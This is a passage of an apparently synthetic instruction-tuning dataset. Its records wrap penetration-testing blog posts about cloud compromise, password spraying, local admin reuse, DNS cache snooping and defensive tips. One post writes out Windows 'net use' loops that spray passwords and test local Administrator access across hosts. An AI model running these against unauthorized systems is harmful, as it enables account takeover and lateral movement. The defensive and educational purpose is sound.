how-to-set-up-an-openvpn-server-on-ubuntu-14-04 The only deviation was that a dependency package needed to be forced apt-get install openvpn easy-rsa apt-get install -f apt-get install openvpn easy-rsa Once openvpn server is up and running and the client files have been configured use the openvpn client built into Linux to connect openvpn --config myvpn.ovpn Now we have a laptop setup that would be a bit more anonymous for reconnaissance activities with Tor browser and Tails when necessary and and to VPN in our VPS as the main attack platform When VPNed into the system using Burp Suite for web app testing fromt the laptop the traffic should appear to come from the offshore VPS After connecting the VPN to the VPS Google thought I was in a different area of the world As a quick test I ran an nmap scan on an externally facing host and using tcpdump to write the network traffic to file I admit it was not a comprehensive test to see if any data was leaking out but for pentesting and red team purposes this should be sufficiently anonymous to raise the bar if you need to do so Non VPN connection scanning from native laptop install VPN connection scanning from native laptop install"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Storm Chasing: How We Hacked Your Cloud</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Red Team, cloud, Cloud computing, hack a cloud, hacking clouds, Pentesting, storm chasing</taxonomies>\n<creation_date>Thu, 26 May 2016 15:34:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Overview The traditional methodology of a remote attacker who has no preconceptions of a target network used to be fairly static With organizations moving to the cloud the approach attackers are taking is going to change drastically if it hasn't already In this blog post I am going to detail why if your organization has moved its assets to the cloud an attacker is likely going to make that their primary attack focus They will likely succeed and you will likely not know that it happened Cloud Computing Primer Scalable storage easy collaboration between employees and cost savings by eliminating the need for a data center are all benefits that organizations see in the cloud From a security perspective there are definitely some added benefits of cloud computing but I am going to discuss a few shortfallings One very common misconception is that the cloud is some mystical flying entity that protects your data saves you valuable hard drive space and shades you from the sun This is the definition of 'cloud computing Cloud Computing n the practice of using a network of remote servers hosted on the Internet to store manage and process data rather than a local server or a personal computer This essentially means that your data that previously would have been on your own system is just on someone else's system now and you are renting space from them There are many considerations that must come to mind when you look at handing your data over to a cloud provider Is the cloud provider doing their own due diligence when it comes to network security Many people see the likes of Google Microsoft and Amazon and immediately believe that because these services are so popular and widespread that they must be secure If one of these organizations had a breach it would be bad for a lot of people Is the data physically secure Your data is physically sitting on a hard drive somewhere inside one of the data centers of the cloud provider you choose What are they doing to protect physical access to those One concern I'm not going to get into in this post but is definitely one many have is this Are the cloud providers themselves being ethical when it comes to the handling of your data Are they able to access whatever they want of yours If so would you know if they do ...And what about if a government entity requests data from them Sure cloud computing is convenient But sacrificing security for convenience is a fatal mistake External Network Pentest Forecast When it comes to an external network architecture most organizations think that there are only two possible attack vectors for an attacker to gain access to internal resources Most think that an attacker must either find a remotely exploitable flaw in an externally exposed system or they must phish an employee of the organization Of course there are a multitude of other ways an attacker might gain access to an organization's internal network but these typically involve some sort of physical access For example many organizations offer wireless networks and occasionally do a poor job at segmenting guest networks from corporate networks There is also the risk of a malicious insider who already has physical access to an internal asset of an organization With organizations moving more and more of their internal data systems assets and communication architecture to the cloud this adds a new attack vector for remote attackers In two other blog posts I've written I detailed ways an external attacker can gain access to domain credentials without being on a target network In part 1 I discussed how employees are reusing the same passwords on personal accounts as corporate accounts and how attackers can find these In part 2 I discuss password spraying Outlook Web Access portals Both of these techniques can result in an attacker gaining access to domain credentials but an attacker who wants to compromise an organization's assets would still need access of some kind to a target network This would historically mean the attacker would still need to find some sort of VPN access or phish an internal employee With more movement of corporate assets to cloud infrastructures it is becoming more likely that an attacker simply needs a valid credential and a web browser to access sensitive corporate data Case Study Let's Go Hack A Cloud Very recently a coworker of mine Derek Banks 0xderuke and myself were performing a Blackbox External Network Assessment The blackbox nature of this assessment means that we had no scoping information No target ranges were provided to us so we were on our own to perform recon and discover where this company's external assets were Through our recon we found a few external hosts but the attack surface was very slim Through bruteforcing of subdomains we discovered an 'autodiscover subdomain The 'autodiscover subdomain is commonly used to assist in the setup of email clients so that the user simply needs to enter an email address and password This is very commonly associated with Microsoft Exchange environments For this particular customer when we navigated a web browser to the autodiscover subdomain we were redirected a Microsoft Office 365 login portal At this point we contacted the customer to determine if the Microsoft Office 365 portal was in scope for testing They confirmed that it was Note when pentesting third-party services of any kind it is very important that the organization communicate that an assessment is going to occur with the third-party Most third-party orgs have a pentest authorization form the organization can fill out to authorize the pentest See below for a list of these During our reconnaissance phase we always try to find both valid email addresses as well as usernames For this particular company we had discovered a relatively low number of valid email addresses and no usernames Nevertheless we proceeded in attempting password-spraying attacks Even with the low number of email addresses we had discovered we were still able to password spray a valid user credential using the always-reliable season-year combination Spring2016 Here's where the magic comes into play when it comes to attacking cloud infrastructures We started with a very small number of valid email addresses and then password sprayed one This organization did not utilize two-factor authentication so at this point we had access to this particular user's Office 365 account which had access to Outlook mail Sharepoint OneDrive etc Before we proceeded in pillaging the Office365 services we wanted to see if we could find any more valid email addresses So naturally we started poking around Outlook The thing we quickly learned was that the Address Book gave us pretty much everything we needed It included the email addresses usernames phone numbers and full names of every employee in the company At this point we now had a complete list of everyone's email address in thecompany Outlook Address Book We continued on with more password spraying this time with a full email list Many more credentials were obtained and we now had access to the cloud infrastructure as a number of different types of users with different roles in the company For each user the types of files and things we could access in the cloud were different But just like a file share on an internal network the permissions must be configured so that only the correct users are able to access protected resources Anytime there is a collaboration documentation platform like Sharepoint used by an organization there is commonly a treasure-trove of data to be found there We found a ton of very sensitive information being stored in this organization's cloud While we navigated through the Sharepoint site and located sensitive company information we more importantly found access to the organization's actual internal infrastructure Sharepoint like pretty much every other cloud service has a very useful 'search function This is useful to employees to find the documents they are looking for fast but is also useful to an attacker if the organization is storing sensitive documents there During our reconnaissance phase we didn't discover any sort of remote access systems like a VPN server This was very much intriguing to us as we assumed that this rather large organization had users accessing their network remotely We performed a search in their Sharepoint site for VPN Low and behold we found a document detailing exactly what VPN client to install where to direct it to connect to and the PIN that must be used along with valid user credentials to authenticate to the organization's network Of course two-factor wasn't enabled on the VPN as well We VPN'd into the network as one of the users we password sprayed From there we escalated privileges to domain admin through our typical means Conclusion While this story ended up with us accessing an organization's internal network infrastructure during a blackbox external network assessment we did it by hacking our way through the organization's cloud infrastructure This particular assessment was focused on attacking the Microsoft Office 365 platform but could easily be performed against similar cloud infrastures like Google or Amazon's AWS If you are an organization that utilizes cloud services to host your organization's data email etc please implement two-factor authentication Had two-factor authentication been enabled during the case study above we would have been stopped way earlier Remember that if you are going to perform a pentest against a third-party service get authorization first I've crafted a list of a few of the auth forms below Pentest Authorization Forms Microsoft Azure ecurity-forms.azure.com penetration-testing terms Amazon AWS ws.amazon.com security penetration-testing Google Cloud Platform loud.google.com security -Interestingly enough Google says you don't have to contact them"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Easiest Con - Hacking the Human & 9 Tips to Avoid Social Engineering</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, be careful whom you trust, con artistry, crying babies, pen-testing, penetration testing, people are kind, people are naive, phishing, scamming, social engineering, trust</taxonomies>\n<creation_date>Tue, 31 May 2016 16:37:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Heather Doerges Of all the services we offer at BHIS Social Engineering is the most interesting to me It's something and quite possibly the only thing I completely understand and feel I am fully capable of doing I also know that it's one of the more difficult and uncomfortable things our testers do This is a good thing to me it means we are employing honest good people who hate lying in order to succeed However they manage and are good at it So what exactly is social engineering It refers to psychological manipulation to get people to do things and give away sensitive information to gain access to a network or computer system It's usually just a portion of a larger con attack on an individual or company It is much like phishing which attempts to get sensitive information such as usernames passwords and credit card details by masquerading as a trustworthy entity in an electronic communication But while phishing might be another part of the overall attack social engineering also includes hacking for information via phone or even sometimes in person Social engineering is used to execute hacking techniques and phishing scams by exploiting our inherent helpfulness kindness naivety and gullibility We're so sneaky How does it work One of the more memorable examples of social engineering I've seen is this outu.be lc7scxvKQOo In this video a hacker plays the sound of a baby crying and then calls a cell phone company in order to gain access to a total stranger's account Because she pretends to be the stranger's newly married wife has a crying baby and acts fairly upset the cell phone company not only gives her access to the email on the account but also allows her to change the guy's password so now he can't even gain access to his account With that information she can now go into his account online and see all his personal account information Let's face it a lot of us keep some very personal information on our phones She had access to his pictures account info location and more probably long before he even realizes she has it Penetration testers employ these methods without the malicious intent to show a company how devastating these attacks can be Our testers are hired by those companies to test how difficult it would be to gain access to their organization or personnel via social engineering So just how hard is it to be resistant to these sorts of attacks There are literally thousands of variations to social engineering attacks Here are some ways to prevent falling victim to social engineering Most criminals exploit human kindness use distractions and questions or pretend to be in the service industry 9 Ways to Avoid Social Engineering 1 Be suspicious of any unsolicited messages or service personnel If the email phone call person looks like it is from a company you use do your own research Use a search engine to go to the real company's site or a phone directory to find their phone number If an unknown individual claims to be from a legitimate organization try to verify his or her identity directly with the company It is very simple to come up with a badge or false ID so don't be fooled by someone who looks legit We've had customers so spun up and paranoid in the face of our penetration testing that even emails from employees in BHIS were double checked against known personnel we applaud their security efforts 2 Slow down Pay attention to your surroundings Scammers want you to act first and think later If someone is conveying a sense of urgency or uses high-pressure sales tactics be skeptical never let their urgency influence your careful review 3 Reject requests for help or offers of help Legitimate companies and organizations do not contact you to provide help If you did not specifically request assistance from the sender consider any offer to 'help restore credit scores refinance a home answer your question check your printer look for termites etc a scam Similarly if you receive a request for help from a charity or organization that you do not have a relationship with delete it 4 Delete or ignore any request for financial information or passwords If you get asked to reply to a message with personal information it's a scam 5 Don't provide information Don't provide personal information or information about your organization including its structure or networks unless you are certain of a person's authority to have the information Even mundane things can add fuel to the fire Another good example of this is when you call a bank or other important organization and they verify your address by asking you Do you still live at 123 Road Street Anytown Ka-ching 6 Don't send sensitive information over the Internet before checking a website's security Pay attention to the URL of a website Malicious websites may look identical to a legitimate site but the URL may use a variation in spelling or a different domain e.g .com vs .net 7 Don't overshare on social media Sharing too much information on social media can enable attackers to guess passwords or extract a person's or a company's confidential information through posts by employees Plus it gives someone more ammunition to use when they attempt to get more personal details If I can find out someone is on maternity leave I can manufacture all kinds of other details to make my social engineering attack seem even more legitimate 8 Install and maintain anti-virus software firewalls and email filters to reduce some of this traffic online 9 Be Careful Whom You Trust This seems really obvious but after helping and seeing my co-workers do social engineering I've learned even more so that people are inherently trusting and helpful They are ready to believe everything you tell them This speaks well to people but is scary when I realize I'm the same way Practice kind helpfulness without automatically trusting someone completely These tips will work for both business and personal areas of life The fact is people need to be trained according to digitalguardian.com PEOPLE are the weakest link in any security application Companies should employ at minimum a bi-annual training geared towards each user group end-users IT staff managers etc so that everyone is aware of the latest attacks After all these attacks aren't using technical employees but any employees Hackers understand that the weakest link is the person with the least amount of education and training Employees should also be tested by having an outside party like the awesome testers at BHIS conduct a social engineering test These kinds of tests help keep the employee on their toes and more likely to avoid the attacks in their business and personal lives Be safe out there"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 061316</title>\n<taxonomies>News, Cisco, Facebook, good time, Google vs. Oracle, Lawrence's List, Linux, Tor</taxonomies>\n<creation_date>Fri, 03 Jun 2016 15:33:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Editor's Note We'll feature Lawrence's List every week It will include interesting things he's come across during the week as he's an avid consumer of internet garbage and follows a lot of mailing lists forums and news sites Some of it may be narrow in terms of who may be interested LKML but occasionally there's a gem in there Some list items will be big news some small news some dumb news some so esoteric it's hard to imagine anyone would care Who knows it might stick The Tor Project has announced release of Tor Browser series 6.0 which includes upgrades to allow the Tor Browser to work with version 45-ESR of Firefox which should make HTML5 and YouTube perform better Other improvements include code signing for OS X removal of SHA1 certificate support and a fix for a potential DLL hijacking vulnerability in Windows log.torproject.org blog tor-browser-60-released Linus Torvalds released a pre patch for Linux 4.7 rc-1 containing a swath of improvements coming in from over 1400 authors A noteworthy new feature coming up in the 4.7 release is LoadPin LoadPin ensures that all kernel modules are loaded from a trusted file system and is Chrome OSs solution to kernel module signing Consider the possibility of only allowing your kernel to load modules from write only media like a CD-Rom There is a boot time option to unset the feature so physical access still means access kml.org lkml 2016 3 28 405 The court proceedings between Google and Oracle came to a temporary close on the 26th when a jury unanimously found that Google's use of the Java API fell under fair use This did not directly affect the circuit court's decision that APIs are copyrightable The Electronic Frontier Foundation feels that the circuit court's ruling which overthrew a previous ruling on the issue about copyright and APIs is in error While this is a win for Google in the short term Oracle has announced that they will be appealing ww.eff.org deeplinks 2016 05 eff-applauds-jury-verdict-favor-fair-use-oracle-v-google ww.eff.org cases oracle-v-google ww.theguardian.com technology 2016 may 31 google-fair-use-victory-oracle-software-androids Cisco has issued a warning that it believes the 'ping of death an IPv6 DoS vulnerability which can cause routing equipment to stop routing IPv6 traffic may be a problem for everyone ools.cisco.com security center content CiscoSecurityAdvisory cisco-sa-20160525-ipv6 BIAS notice I don't trust advertising to begin with I found this article a fun read it follows a diversion down the rabbit hole of an interesting and sneaky ad found on Facebook edium.com hunchly bait-and-switch-the-failure-of-facebook-advertising-an-osint-investigation-37d693b2a858 .asvbapzg5 A while back I was working on a front end for a project and posed the question to some of my colleagues How would you rate browser local storage in terms of security This week the PortSwigger blog had an article that tackled that question log.portswigger.net 2016 05 web-storage-lesser-evil-for-session.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>10 Ways to Protect Your Online Digital Life</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, InfoSec 101, Joff Thyer, backups, credit cards, credit freeze, dedicated browser, digital life, online banking, online life, passphrases, passwords, physical copies, privacy, protecting yourself</taxonomies>\n<creation_date>Mon, 06 Jun 2016 17:15:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Recently I have been thinking about online challenges I encounter in daily life As I thought about it I realized that many of these items I practice on a regular basis While it feels pretty intuitive to me to follow these guidelines it may not feel as mainstream to many others so I thought I would write some things down Adopt a mindset that there will be a business that gets compromised and that you have provided some of your data to in the past How are you going to mitigate the risk to your own personally identifiable information What are you doing proactively before a breach occurs and how will you protect yourself when you learn that your own data is at risk Below is a suggestion list of good digital hygiene items that I came up with 1 Use long pass-phrases.In the information security community we talk about this all the time Our line of thinking is that a pass-phrase ie unique sentence is easier to remember than a complex password On the subject of length longer than 16 characters make for good strength One example might be WeLoveDriving2TheMountains4FunTimesAndAdventures Shorter length passwords are subject to both brute force and dictionary attacks In addition to pre-computed encrypted password representations there exist very large dictionaries of common passwords and plenty of computing cycles to perform offline attacks It is entirely feasible that any organization you are doing online business with will have their encrypted password database stolen ex-filtrated at some point in time Your choice to use a very long passphrase is going to make plaintext recovery of your specific password computationally challenging 2 Use an online password vaulting application with two-factor authentication.There are many good choices in this arena today The beautiful thing about a password vaulting application is that remembering your own master passphrase key is the main responsibility For passphrases passwords to all applications within the vault you can choose to use the maximum length complexity and pseudo-randomness that the application permits and avoid reusing passphrases entirely Sadly with some applications the passphrase length and complexity is limited The downside of a password vaulting approach is that all your eggs are indeed in one basket so you better choose an application vendor that is time tested highly reputable and of course has a very secure approach to managing this critical data In addition to choosing your strong primary passphrase to the vault I would strongly advise using a second-factor authentication to access the vault 3 Use a dedicated computer and or dedicated web browser for financial transactions.Your browser gets significantly polluted and potentially compromised from generalized web surfing You have all seen persistent cookies which present targeted advertising in different browser tabs Tracking and profiling using cookie information are very common these days A cross-site request forgery CSRF attack could easily happen and you would never know what hit you until it's too late A CSRF attack involves exploiting an existing application by manipulating the trust relationship that your browser has in one browser tab from a separate browser tab or window Trusted browser cookie data is usually manipulated in order to perform the attack You know which banking and other financial sites which are important to you and that you use to manage your own sensitive data on a regular basis At a minimum dedicate a web browser to perform those actions and make sure that the browser never visits any other website other than what you have selected to be within the inner circle of trust Clear all browser history and cookie data upon exit every single time from that browser Even better if you can dedicate a computer or virtual machine entirely to this task It takes some discipline but it is worthwhile to pursue 4 Guard your privacy as much as possible.Let's admit that many of us use social media How much information are you sharing about yourself in the process Think for a moment how much information you wish to share and only go that far Know that once you sign-up for social media anything you provide is potentially public information Understand and control your public media presence Only share information that you are comfortable standing in the middle of a busy street and yelling the same information aloud 5 Don't install risky applications with known vulnerabilities.While the operating system landscape has slowly evolved and improved over the years to automate vulnerability remediation and patch management the application landscape is quite different There are many known vulnerabilities in applications over time In particular products like Java Adobe readers and flash media software have had a string of known vulnerabilities Think about whether you really need to use this software Does it belong on your computer at all and can you live without it 6 Use full disk flash media encryption on mobile devices.Your mobile computing device might get lost or stolen at some point in your travels What data is contained on that device and what prevents the thief from mercilessly pillaging the information from the device Make sure that you have an idle timeout and screen lock configured on the device Make sure the pass-phrase is strong and ensure that data is only acceptable after your credentials have been successfully entered 7 Always use credit cards when traveling and monitor accounts closely.This one is directed more towards the road warriors Here in the U.S the danger of compromising your debit card means potentially losing your banking funds and not being able to recover them As sad as it is the larger credit card companies have become very good at data analytics and identifying out of character transactions They will shut your account down very quickly if they suspect fraud Those of us who travel frequently know this all too well because invariably it becomes a false positive situation for us But more to the point you are not putting your personal banking funds directly at risk by using credit and recovery from a fraudulently used credit card has become fairly routine A useful addendum to this idea is to use Paypal for online purchases It is a well tested and secure transaction service that affords a nice level of protection for your online experience 8 Restrict access to your credit report credit freezeWhenever you apply for a new loan of some sort your credit scores will be checked with the major agencies There is very little reason to allow your credit scores to be checked indiscriminately and since there have been numerous personal identity compromises the credit agencies do allow you to freeze your credit line checks not allowing the credit line check to proceed without your authorization In many U.S states this is now backed by law 9 Backup your dataHow would you recover if you became a victim of ransomware This type of malware usually results in your data getting encrypted and then results in a demand for payment to recover an encryption key and decrypt said data From a personal user perspective there are many backup services available which will make sure your secure data is stored in the cloud Rather than pay the ransom I suspect most would prefer to format and start over 10 Make a copy of key account numbers and store it in a safe or other physically secure location.When all else fails sometimes you just need the paper I would suggest having a small fireproof waterproof safe at home in which you can store valuable information such as birth certificates passports backup media if you like and more to the point some printed information that gives you some recovery mechanisms should a real disaster occur that renders your digital devices worthless"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wide-Spread Local Admin Testing</title>\n<taxonomies>Author, Brian Fehrman, External/Internal, Password Spray, Red Team, domain admin, local admin testing, password, password spraying</taxonomies>\n<creation_date>Mon, 13 Jun 2016 16:14:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman In our experience we see many Windows environments in which the local Administrator password is the same for many machines We refer to this as Wide-Spread Local Administrator Re-use This type of configuration is extremely advantageous to an attacker Once the attacker has the local Administrator password for one computer they can usually pivot to other computers in the environment with ease and begin retrieving other user credentials and potentially sensitive information on the systems In some cases only the Administrator hash is needed to pivot with that account We typically start with a non-privileged user when performing pivot engagements and attempt to escalate privileges to that of a Domain Administrator On a recent engagement a lot of the normal escalation techniques didn't work out Beau Bullock dafthack hopped on to aid me as he so often does and we put our heads together on this One of the escalation methods that I had already tried was password spraying For those that don't know the concept of this method is that you try a few common passwords against a large set of users The advantages that this technique has over brute-force login attempts is that you are less likely to lockout accounts and are very likely to find a valid password for at least one user During this engagement the network was small and only one valid set of credentials was found The user did not have special privileges anywhere but they were able to access an internal SharePoint-type server that our user could not access We browsed around the SharePoint server and were able to find a document that detailed how new user-machines should be setup In this document it told what the local Administrator password should be for every new workstation It did not talk about changing it Re-read that and give it a moment to digest As you can imagine we were thrilled Almost immediately we tried the password on our machine Sadly however it did not work It had to be valid somewhere though...and we needed a way to check Metasploit contains modules that allow for you to do this The modules require a session to be established on your internal computer first We could have established a session but we wanted an easier way Thinking back to the password spraying attack it hit us that command could just be modified to test for wide-spread local admin use The following is a typical password spraying command FOR F p in pass.txt DO FOR F n in users.txt DO net use LOGONSERVER IPC user domain n p 1 NUL 2 1 echo n p net use delete LOGONSERVER IPC NUL Effectively it takes a password out of the pass.txt file and pairs it up with each user in the user.txt file It then attempts to authenticate each user pass combo against the domain's LOGONSERVER by issuing a net use command as that user How do we modify this for testing for wide-spread local admin Simple First we need to get a list of systems in the environment The following command can be used for this task net view domain systems.txt Next we need to modify our loop a bit For this check we assume that we have a valid set of credentials We need to iterate over the systems rather than users and passwords We modified the password spraying command to be as follows FOR F s in systems.txt DO net use s C Administrator AdminPass 1 NUL 2 1 echo s admin_access.txt net use delete s C NUL The concept of the command is the same as before but attempts to access the C share on each machine rather than the IPC share on the domain's logon server Anywhere that this command succeeds we know that the Administrator credential is valid The list of systems on which the account is valid are output to a file named admin_access.txt You could then start grabbing up credentials off each of those machines using one of many methods In our case this showed us that the credential we found was valid for almost 200 machines on the network and we were quickly on our way to DA In conclusion Wide-Spread Local Administrator accounts continue to be a common problem in many networks There are existing methods to test for this once you have a valid set of credentials Here we have described an easy way that you can do this by using built-in tools on the Windows command shell"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Are you Snoopable?!</title>\n<taxonomies>Blue Team, DNS, DNS cache snooping, Nmap, Snooping</taxonomies>\n<creation_date>Wed, 08 Jun 2016 15:05:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser All right you've taken all the precautions related to your network You have lockout controls in place you use awesome password policies 20 characters with uppercase lowercase special characters and wingdings Two factor is everywhere web apps are locked down cross-site-scripting and SQL injection are not viable You are feeling good about the security of your infrastructure So why may you still be worried other than you are a systems admin It seems like Social Engineering is becoming the new attack vector these days Why Because it is easier to find out information on specific people in your organization and target them for valuable information as opposed to getting it from the network Eventually everyone will have networks so secure that you don't need to worry about them any more Right Here at BHIS we could only hope so but in the meantime we will keep pumping out blog posts and helping find the vulnerabilities You may wonder where I am going with this Well sometimes we overlook little things like Domain Name Server DNS Cache Snooping Many non-technical readers may wonder what the heck a DNS is and what it does Without getting too technical a DNS is utilized to translate human-readable format to the machine language in this case the IP address of the system you are trying to reach For example if you type www.peanuts.com into your browser the request will be sent to a DNS server that searches for the record IP that goes with www.peanuts.com The record for this example would translate to an IP address of 54.201.160.175 You can see how typing in an easy to remember name is easier than typing in the IP address Many have used the analogy of a phone book for correlating the naming convention with the IP address of the system Several organizations have and manage their own Domain Name Server s depending on the number of IPs that they have and if they are frequently changing machines hostnames or IP addresses It is easier to manage changes to the DNS locally than having to fax or fill out paperwork to a third party to make changes If your organization manages its own DNS then this blog would be intended for you DNS uses recursive and non-recursive lookups depending if the site has been cached stored locally or not Recursive This type of lookup is utilized if the website is not known by your DNS The Domain Naming Server will have to poll other servers to get the information to resolve the website name to an IP address and route your traffic correctly Non-Recursive This type of lookup is stored in the cache of your Domain Name Server so it is easily accessed without going out and polling other servers as it would have to do with a Recursive lookup DNS cache snooping is used by attackers to gather information about your organization's browsing habits This information can be utilized to plan an attack against your company such as email phishing or spearfishing campaigns This can also disclose sensitive information such as financial institutions that have been visited recently or other sensitive websites that a company might not want to be public knowledge Depending on how your DNS server s is configured and sitting on the network may determine the level of risk For example if you are sitting inside your network your Domain Name Server may allow caching of websites for people that are on the local network and not for those external to your network It is always recommend testing from outside of your network to determine if cache snooping is valid from public spaces Although cache snooping may be realized within your network the risk would be lower since an attacker would have to have access from within your network before they are able to snoop My Side Your Side Inside Outside A simple test is to use Nmap with a dns-snoop-cache.nse script Below I have run the script to on the Google DNS at 8.8.8.8 to validate that it is caching websites By default the Nmap command utilized is a non-recursive lookup therefore the output relates to those sites that are cached on the server Nmap Output of script dns-cache-snoop.nse for 8.8.8.8 As you can see from the output above there are 61 of 100 of the domains cached at Googles 8.8.8.8 DNS I should also point out that Nmap uses a pre-configured set of the top 100 domains to check against for determining if they are cached or not You can supply the list of domains if you would like and thus make it more specific to your organization By utilizing an argument along with the Nmap command to specify the domains you would like to check The argument is 'dns-cache-snoop.domains host1 host2 host3 etc The screenshot below demonstrates an output of using specific domains or hosts Supplying Specific Domains If you want to find out which sites have been visited recently you can use the argument 'dns-cache-snoop.mode timed this can only run reliably once since it also caches to the server Using Timing Argument with Nmap You can see that the most recent sites visited are a little different than when the Nmap command was run without the 'dns-cache-snoop.mode timed argument was included Depending on how your DNS server is set-up you may not get any information It also may depend on if your organization is blocking certain domains Many organizations will block the top 100 domains since a majority of them are related to social or shopping sites If this is the case you might want to check for specific domains such as wellfargo.com or chase.com You can also go to a specific site on your network and then check to see if you DNS has cached it There are other vulnerabilities related to DNS such as cache poisoning Distributed Denial of Service DDoS or DNS amplification attacks I will save these for future discussion since for many DNS is not as exciting as things like cute kitty videos that we all love Happy Snooping Bonus Points What show is the image of in this blog and what is the character's name Tweet us BHinfoSecurity if you know the answer"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lawrence's List 061016</title>\n<taxonomies>News, bad passwords, bsides, CII, CII best practice badge, CONs, domain typo squatting, infosec cons, IoT, Lawrence's List, password fails, passwords, reverse engineering</taxonomies>\n<creation_date>Fri, 10 Jun 2016 18:04:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman It's been one of those crazy busy weeks I always feel like I didn't get enough time to read articles surf Reddit and attempt to keep up with LKML I know this can't be done but what can I say I have a problem Also the week ends with BSidesMSP Which is awesome If you're reading this on Friday or Saturday June 10 11 come chat with GailMenius and I down at the BHIS OCM booth I am super excited to see what security stories the IoT era will bring I feel like this article is another small preview imagine this kind of security failure in every important device you own ww.pentestpartners.com blog hacking-the-mitsubishi-outlander-phev-hybrid-suv Mark Zuckerberg momentarily lost control of two of his accounts this week due to weak passwords Not much more to say about that ww.theregister.co.uk 2016 06 06 facebook_zuckerberg_social_media_accnt_pwnage Domain typo squatting is an old trick This article takes that to a new realm The author had the bright idea to typo squat a package manager I'll admit this was much more successful than I'd suspected it would be I'll also admit that I've been nervously double checking package names since reading this article ncolumitas.com 2016 06 08 typosquatting-package-managers While I don't reverse engineer hardware myself or even have access to the tools for that matter I always like to read about hardware reversing efforts There's been a good series going since april over at jcjc-dev.com since April The fourth part in the series was posted on Wednesday this week it has made for some pretty informative and reading cjc-dev.com 2016 04 08 reversing-huawei-router-1-find-uart The Core Infrastructure Initiative CII has announced a best practices badge for security The badge is intended to give developers a checklist of lessons learned the hard way by other Free Libre and Open Source Software FLOSS projects By meeting the checklist of criteria not only is a project earning an endorsement of sorts but also creating climate of expected attention to good security practices within FLOSS software ww.coreinfrastructure.org news announcements 2016 05 free-badge-program-signals-what-open-source-projects-meet-criteria I'm wrapping this up at BSidesMSP if you're here feel free to drop by the BHIS booth and see us"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bitlocker Ransomware: Using BitLocker for Nefarious Reasons</title>\n<taxonomies>InfoSec 301, Robert Schwass, bitlocker, hacking, Microsoft, ransomeware, Windows 10</taxonomies>\n<creation_date>Wed, 15 Jun 2016 15:52:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
